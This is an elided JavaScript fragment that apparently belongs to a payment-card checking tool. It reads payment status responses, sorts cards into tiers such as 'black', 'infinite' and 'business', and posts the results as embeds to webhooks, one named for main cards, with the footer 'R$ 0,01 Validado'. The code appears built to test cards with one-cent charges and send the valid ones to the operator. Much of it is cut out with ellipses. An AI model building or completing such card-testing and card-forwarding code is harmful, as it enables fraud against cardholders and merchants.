    ...
    try {
        await axios.post(WEBHOOKS.PIX, {
            embeds: [{
                ...
                footer: { text: "Avisado via Servidor Seguro" },
                timestamp: new Date()
            }]
        });
    ...
    try {
        ...
        if (response.data.status === 'approved' || response.data.status === 'in_process') {
            ...
            if (modelo.includes('black') || modelo.includes('infinite')) {
                ...
                cor = 0xf1c40f;
            } else if (modelo.includes('business')) {
                urlDestino = WEBHOOKS.BUSINESS;
                cor = 0x8e44ad;
            } else if (modelo.includes('standard')) {
            ...
            const embedFinal = {
                embeds: [{
                    ...
                    footer: { text: "R$ 0,01 Validado" },
                    timestamp: new Date()
                }]
            };

            await axios.post(WEBHOOKS.PRINCIPAL_CARTOES, embedFinal);
